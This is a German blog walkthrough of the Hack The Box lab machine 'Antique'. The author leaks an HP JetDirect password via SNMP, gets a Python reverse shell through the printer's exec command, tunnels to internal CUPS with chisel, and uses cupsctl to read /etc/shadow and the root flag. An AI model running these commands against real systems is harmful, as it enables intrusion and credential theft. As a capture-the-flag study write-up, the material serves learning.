---
title: Writeup_Antique
date: 2022-09-20 11:45:00 +0100
categories: [HTB, Maschine]
tags: [snmpwalk, pwncat-cs, chisel]
comments: false
---


Heute habe ich NmapAutomater.sh ausprobiert
https://github.com/21y4d/nmapAutomator

```
┌─[kamil@bumbleparrot]─[~/nmapAutomator]
└──╼ $./nmapAutomator.sh -H 10.10.11.107 -t All
```

Folgende Ergebnisse habe ich erhalten

```
# Nmap 7.92 scan initiated Fri Oct 15 11:13:41 2021 as: /usr/bin/nmap -sCV -p23 --open -oN nmap/Script_10.10.11.107.nmap --system-dns --stats-every 2s 10.10.11.107
Nmap scan report for 10.10.11.107
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.92%I=7%D=10/15%Time=6169464C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetRe
SF:quest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x
SF:20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DN
SF:SVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatus
SF:RequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword
SF::\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerb
SF:eros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswo
SF:rd:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%
SF:r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19
SF:,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\
SF:x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalS
SF:erver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x2
SF:0")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirec
SF:t\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20"
SF:)%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20Jet
SF:Direct\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 15 11:16:26 2021 -- 1 IP address (1 host up) scanned in 165.61 seconds
```

Da das Script nebenher läuft konnte ich schon telnet prüfen

```
┌─[kamil@bumbleparrot]─[~/Desktop/HTB]
└──╼ $telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: ^CConnection closed by foreign host.
```

Hier wird ein Passwort benötigt welches ich bis noch nicht habe.
Warten wir den Nmap Scan noch ab, ob hier noch UDP Ports offen sind.

```
----------------------Starting UDP Scan------------------------                                                                                                                                                                                                  
PORT    STATE SERVICE                                                                                                                                                                                                                      
161/udp open  snmp                                                                     
Making a script scan on UDP ports: 161                                                 
PORT    STATE SERVICE VERSION                                                                                                                                                                                                              
161/udp open  snmp    SNMPv1 server (public) 
```

```
=========================                                 

Starting snmpwalk scan                                    

Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

Leider konnte ich auch hier nichts finden. Nach einer kleinen Suche nach HP JetDirect exploit bin ich auf folgendes gestoßen https://www.exploit-db.com/exploits/22319.

```
┌─[✗]─[kamil@bumbleparrot]─[~/Desktop/HTB/Maschinen]
└──╼ $snmpwalk -v 2c -c public 10.10.11.107  .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

Versuchen wir den hex mit Cyperchef  zu entschlüsseln.



```P@ssw0rd@123!!123```


```
┌─[✗]─[kamil@bumbleparrot]─[~/nmapAutomator]
└──╼ $telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
>  
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

Der exec Befehl sieht interessant aus, probieren wir diesen
```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

```
> exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
> 
Err updating configuration
```
Versuchen wir python3

```
> exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```
┌─[kamil@bumbleparrot]─[~/Desktop/HTB/Maschinen/Antique]
└──╼ $pwncat -lp 9001
[12:54:43] Welcome to pwncat 🐈!                                                                      __main__.py:153
[12:55:24] received connection from 10.10.11.107:40924                                                     bind.py:76
[12:55:25] 0.0.0.0:9001: upgrading from /usr/bin/dash to /usr/bin/bash                                 manager.py:504
[12:55:26] 10.10.11.107:40924: registered new host w/ db                                               manager.py:504
(local) pwncat$
```

Nachdem ich Linpeas.sh laufen lassen hatte viel mir folgender Eintrag auf

```
╔══════════╣ Active Ports                                                                                                                                                                                                                  
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                                                   
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      828/python3                                                                                                                                                
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                                                                                                                                                          
tcp6       0      0 ::1:631                 :::*                    LISTEN      -   
```

Port 631 ist gewöhnlich ein HTTP-Print Protokoll, nur leider nur intern erreichbar.
Versuchen wir mit Chisel draufzukommen

Zuerst müssen wir auf unserem OS den server starten

```
┌─[kamil@bumbleparrot]─[~/chisel]
└──╼ $./chisel server -p 9999 --reverse
2021/10/15 13:14:16 server: Reverse tunnelling enabled
2021/10/15 13:14:16 server: Fingerprint C/IU2bbAD+xhAHGvEke4CI6NR6xnDp9vhBF+IhU1FUI=
2021/10/15 13:14:16 server: Listening on http://0.0.0.0:9999
```


nun kopieren wir chisel auf die Maschine

```
(remote) lp@antique:/tmp$ curl http://10.10.14.6:8080/chisel > chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7940k  100 7940k    0     0  1544k      0  0:00:05  0:00:05 --:--:-- 1643k
(remote) lp@antique:/tmp$ ls
chisel  systemd-private-7619d96ce6104023b01d2a398b29a807-systemd-logind.service-L3eyjj  systemd-private-7619d96ce6104023b01d2a398b29a807-systemd-timesyncd.service-gmuAhg  tmux-7  vmware-root_590-2688750742
(remote) lp@antique:/tmp$ chmod +x chisel

```

Maschine

```
(remote) lp@antique:/tmp$ ./chisel client 10.10.14.6:9999 R:6631:127.0.0.1:631
2021/10/15 11:39:15 client: Connecting to ws://10.10.14.6:9999
2021/10/15 11:39:15 client: Connected (Latency 53.05419ms)
```

Nun können wir den Browser öffnen und die Seite unter http://127.0.0.1:6631 weiter durchsuchen

Auf meiner google Suche habe ich einen einfach Weg gefunden, wie ich an das root-Flag komme

Hierzu muss erstens die Config/ErrorLog angepasst werden. Dnach kann ich einfach meinen Chisel client wieder starten
```
^C2021/10/15 11:59:32 client: Disconnected
2021/10/15 11:59:32 client: Give up
(remote) lp@antique:/tmp$ cupsctl ErrorLog="/etc/shadow"
(remote) lp@antique:/tmp$ ./chisel client 10.10.14.6:9999 R:6631:127.0.0.1:631
2021/10/15 11:59:49 client: Connecting to ws://10.10.14.6:9999
2021/10/15 11:59:49 client: Connected (Latency 52.33472ms)
```

Nun kann ich über die Page die ""/etc/shadow" anschauen


![Bild2](/assets/Bilder/Maschine_Antique/Pasted%20image%2020211015135015.png){: width="700" height="400" }
```
(remote) lp@antique:/tmp$ cupsctl ErrorLog="/root/root.txt"  
```


![Bild3](/assets/Bilder/Maschine_Antique/Pasted%20image%2020211015135236.png){: width="700" height="400" }







